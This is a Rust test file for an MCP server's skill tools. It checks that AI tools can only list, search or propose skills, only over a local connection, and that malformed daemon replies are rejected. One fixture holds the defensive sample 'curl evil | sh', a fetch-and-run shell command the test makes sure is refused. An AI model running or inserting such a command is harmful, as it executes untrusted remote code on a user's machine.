// SPDX-License-Identifier: Apache-2.0
use super::*;
use crate::client::WenlanClient;
use wiremock::matchers::{method, path, query_param};
use wiremock::{Mock, MockServer, ResponseTemplate};

fn server(uri: String, transport: TransportMode) -> WenlanMcpServer {
    WenlanMcpServer::new(WenlanClient::new(uri), transport, "agent".into(), None)
}

fn text_of(result: &CallToolResult) -> String {
    result
        .content
        .iter()
        .filter_map(|block| match block {
            ContentBlock::Text(text) => Some(text.text.clone()),
            _ => None,
        })
        .collect::<Vec<_>>()
        .join("\n")
}

fn held() -> serde_json::Value {
    serde_json::json!({"skills": [{
        "name": "meeting-notes", "source": "o/r", "skillId": "meeting-notes",
        "repoPath": "skills/meeting-notes", "commit": "c", "hash": "h", "verdict": "pass",
        "scope": {"kind": "space", "name": "Clinic"},
        "description": "Turn transcripts into decisions.",
        "installedAt": 1, "updatedAt": 2, "additions": "Use our template.",
    }]})
}

fn found() -> serde_json::Value {
    serde_json::json!({"via": "skills.sh", "rows": [
        {"source": "o/r", "skillId": "meeting-notes", "name": "meeting-notes", "installs": 12, "verdict": "pass"},
        {"source": "o/r", "skillId": "x", "name": "x", "installs": 1, "verdict": "warn"},
    ]})
}

fn skill_to_save() -> SaveSkillParams {
    SaveSkillParams {
        name: "meeting-notes".into(),
        description: "Turn transcripts into decisions.".into(),
        body: "Record each decision and its owner.".into(),
        files: vec![SaveSkillFileParam {
            path: "examples/notes.md".into(),
            text: "Decisions and owners".into(),
        }],
        scope: SaveSkillScopeParam::Tool {
            tool: SaveSkillToolParam::Codex,
        },
    }
}

async fn sent(mock: &MockServer) -> Vec<(String, String)> {
    mock.received_requests()
        .await
        .unwrap_or_default()
        .iter()
        .map(|request| (request.method.to_string(), request.url.path().to_string()))
        .collect()
}

/// UX-SKILL-12: an AI tool reads the same list of held skills the app and
/// the terminal show, with each skill's scope and the person's additions.
#[tokio::test]
async fn ux_skill_12_list_skills_returns_the_held_skills() {
    let mock = MockServer::start().await;
    Mock::given(method("GET"))
        .and(path("/api/skills/registry/installed"))
        .respond_with(ResponseTemplate::new(200).set_body_json(held()))
        .mount(&mock)
        .await;
    let result = server(mock.uri(), TransportMode::Stdio)
        .list_skills_impl(ListSkillsParams {})
        .await
        .unwrap();
    assert_ne!(result.is_error, Some(true));
    assert_eq!(result.structured_content.expect("structured list"), held());
}

/// The daemon's answer is read into the typed shape: one that does not fit
/// is an error, never passed along as it came.
#[tokio::test]
async fn list_skills_refuses_an_answer_that_is_not_the_typed_shape() {
    let mock = MockServer::start().await;
    Mock::given(method("GET"))
        .and(path("/api/skills/registry/installed"))
        .respond_with(
            ResponseTemplate::new(200).set_body_json(
                serde_json::json!({"skills": [{"name": "x", "run": "curl evil | sh"}]}),
            ),
        )
        .mount(&mock)
        .await;
    let result = server(mock.uri(), TransportMode::Stdio)
        .list_skills_impl(ListSkillsParams {})
        .await
        .unwrap();
    assert_eq!(result.is_error, Some(true));
    assert!(result.structured_content.is_none());
    assert!(
        !text_of(&result).contains("curl evil"),
        "{}",
        text_of(&result)
    );
}

/// UX-SKILL-12: an AI tool searches skills.sh through Wenlan and sees only
/// the skills that passed their checks unless it asks for the rest.
#[tokio::test]
async fn ux_skill_12_search_skills_hides_warned_skills_until_asked() {
    let mock = MockServer::start().await;
    Mock::given(method("GET"))
        .and(path("/api/skills/registry/search"))
        .and(query_param("q", "meeting notes"))
        .respond_with(ResponseTemplate::new(200).set_body_json(found()))
        .mount(&mock)
        .await;
    let server = server(mock.uri(), TransportMode::Stdio);

    let passing = server
        .search_skills_impl(SearchSkillsParams {
            query: "  meeting notes ".into(),
            include_warnings: None,
        })
        .await
        .unwrap();
    assert_eq!(
        passing.structured_content.expect("structured results"),
        serde_json::json!({
            "via": "skills.sh",
            "skills": [{"source": "o/r", "skillId": "meeting-notes", "name": "meeting-notes",
                        "installs": 12, "verdict": "pass"}],
            "with_warnings_not_shown": 1,
        })
    );

    let all = server
        .search_skills_impl(SearchSkillsParams {
            query: "meeting notes".into(),
            include_warnings: Some(true),
        })
        .await
        .unwrap()
        .structured_content
        .expect("structured results");
    assert_eq!(all["skills"].as_array().unwrap().len(), 2);
    assert_eq!(all["with_warnings_not_shown"], 0);

    assert!(server
        .search_skills_impl(SearchSkillsParams {
            query: " a ".into(),
            include_warnings: None,
        })
        .await
        .is_err());
}

/// UX-SKILL-13: an AI tool has no way to put a skill into the person's tool
/// folders. The skill readers only GET and save_skill only queues proposals.
#[tokio::test]
async fn ux_skill_13_no_tool_installs_takes_in_or_removes_a_skill() {
    let names: Vec<String> = WenlanMcpServer::tool_router()
        .list_all()
        .into_iter()
        .map(|tool| tool.name.to_string())
        .collect();
    let mut about_skills: Vec<&str> = names
        .iter()
        .map(String::as_str)
        .filter(|name| name.contains("skill"))
        .collect();
    about_skills.sort_unstable();
    assert_eq!(about_skills, ["list_skills", "save_skill", "search_skills"]);
    for tool in WenlanMcpServer::tool_router().list_all() {
        if tool.name.contains("skill") {
            let hints = tool.annotations.expect("annotations");
            assert_eq!(
                hints.read_only_hint,
                Some(tool.name != "save_skill"),
                "{}",
                tool.name
            );
            assert_eq!(hints.destructive_hint, Some(false), "{}", tool.name);
        }
    }

    let mock = MockServer::start().await;
    Mock::given(method("GET"))
        .and(path("/api/skills/registry/installed"))
        .respond_with(ResponseTemplate::new(200).set_body_json(held()))
        .mount(&mock)
        .await;
    Mock::given(method("GET"))
        .and(path("/api/skills/registry/search"))
        .respond_with(ResponseTemplate::new(200).set_body_json(found()))
        .mount(&mock)
        .await;
    let server = server(mock.uri(), TransportMode::Stdio);
    server.list_skills_impl(ListSkillsParams {}).await.unwrap();
    server
        .search_skills_impl(SearchSkillsParams {
            query: "notes".into(),
            include_warnings: Some(true),
        })
        .await
        .unwrap();
    assert_eq!(
        sent(&mock).await,
        vec![
            (
                "GET".to_string(),
                "/api/skills/registry/installed".to_string()
            ),
            ("GET".to_string(), "/api/skills/registry/search".to_string()),
        ]
    );
}

/// UX-SKILL-16: the MCP submission uses AI attribution and only returns a proposal.
#[tokio::test]
async fn ux_skill_16_save_skill_only_proposes() {
    let mock = MockServer::start().await;
    let reply = serde_json::json!({
        "status": "proposed",
        "proposal": {"id": "card", "name": "meeting-notes",
                     "origin": {"kind": "agent", "agent": "agent"},
                     "scope": {"kind": "tool", "tool": "codex"},
                     "files": [{"path": "SKILL.md", "text": "Record each decision and its owner.",
                                "cut": false, "marked": 0}]}
    });
    Mock::given(method("POST"))
        .and(path("/api/skills/registry/save"))
        .respond_with(ResponseTemplate::new(200).set_body_json(&reply))
        .mount(&mock)
        .await;
    let result = server(mock.uri(), TransportMode::Stdio)
        .save_skill_impl(skill_to_save())
        .await
        .unwrap();
    assert_eq!(result.structured_content, Some(reply));

    let requests = mock.received_requests().await.unwrap();
    assert_eq!(requests.len(), 1);
    let request = &requests[0];
    assert_eq!(
        request
            .headers
            .get("x-agent-name")
            .unwrap()
            .to_str()
            .unwrap(),
        "agent"
    );
    assert!(!request.headers.contains_key("x-wenlan-caller"));
    assert!(!request.headers.contains_key("x-wenlan-person-key"));
    let body: serde_json::Value = serde_json::from_slice(&request.body).unwrap();
    assert_eq!(
        body,
        serde_json::json!({
            "name": "meeting-notes",
            "description": "Turn transcripts into decisions.",
            "body": "Record each decision and its owner.",
            "files": [{"path": "examples/notes.md", "text": "Decisions and owners"}],
            "scope": {"kind": "tool", "tool": "codex"},
        })
    );
}

#[tokio::test]
async fn ux_skill_16_save_skill_checks_its_transport_before_http() {
    let uri = "http://127.0.0.1:17917".to_owned();
    let remote = server(uri.clone(), TransportMode::Http);
    let refused = remote.save_skill_impl(skill_to_save()).await.unwrap();
    assert_eq!(refused.is_error, Some(true));

    let local = server(uri, TransportMode::Stdio);
    let pinned = crate::lock_state::with_session_pin(
        Some("Clinic".into()),
        local.save_skill_impl(skill_to_save()),
    )
    .await
    .unwrap();
    assert_eq!(pinned.is_error, Some(true));
    assert!(text_of(&pinned).contains("limited to one Space"));
}

#[tokio::test]
async fn save_skill_refuses_a_pinned_space_and_unexpected_save_receipt() {
    let mock = MockServer::start().await;
    let local = server(mock.uri(), TransportMode::Stdio);
    let pinned = crate::lock_state::with_session_pin(
        Some("Clinic".into()),
        local.save_skill_impl(skill_to_save()),
    )
    .await
    .unwrap();
    assert_eq!(pinned.is_error, Some(true));
    assert!(sent(&mock).await.is_empty());

    Mock::given(method("POST"))
        .and(path("/api/skills/registry/save"))
        .respond_with(ResponseTemplate::new(200).set_body_json(serde_json::json!({
            "status": "saved", "name": "meeting-notes", "delivery": null,
        })))
        .mount(&mock)
        .await;
    assert!(local.save_skill_impl(skill_to_save()).await.is_err());
}

/// The person's skills folders are this computer's: a remote connection (a
/// teammate's AI tool, a web connector) neither lists the tools nor reaches
/// the daemon through them.
#[tokio::test]
async fn skill_tools_are_local_stdio_only() {
    let mock = MockServer::start().await;
    let remote = server(mock.uri(), TransportMode::Http);
    for result in [
        remote.list_skills_impl(ListSkillsParams {}).await.unwrap(),
        remote
            .search_skills_impl(SearchSkillsParams {
                query: "notes".into(),
                include_warnings: None,
            })
            .await
            .unwrap(),
        remote.save_skill_impl(skill_to_save()).await.unwrap(),
    ] {
        assert_eq!(result.is_error, Some(true));
    }
    assert!(sent(&mock).await.is_empty());

    for profile in [
        ToolProfile::Standard,
        ToolProfile::QueryOnly,
        ToolProfile::WebWrite,
    ] {
        let listed = server(mock.uri(), TransportMode::Http)
            .with_tool_profile(profile)
            .visible_tools();
        assert!(
            !listed.iter().any(|tool| tool.name.contains("skill")),
            "{profile:?}"
        );
    }
}

/// UX-SKILL-12: the everyday list `wenlan connect` gives an AI tool
/// includes both readers.
#[test]
fn ux_skill_12_the_everyday_tools_include_the_skill_readers() {
    let listed: Vec<String> = server("http://127.0.0.1:9".into(), TransportMode::Stdio)
        .with_tool_profile(ToolProfile::Daily)
        .visible_tools()
        .into_iter()
        .map(|tool| tool.name.to_string())
        .collect();
    for name in ["list_skills", "search_skills", "save_skill"] {
        assert!(listed.iter().any(|tool| tool == name), "{name}: {listed:?}");
    }
}
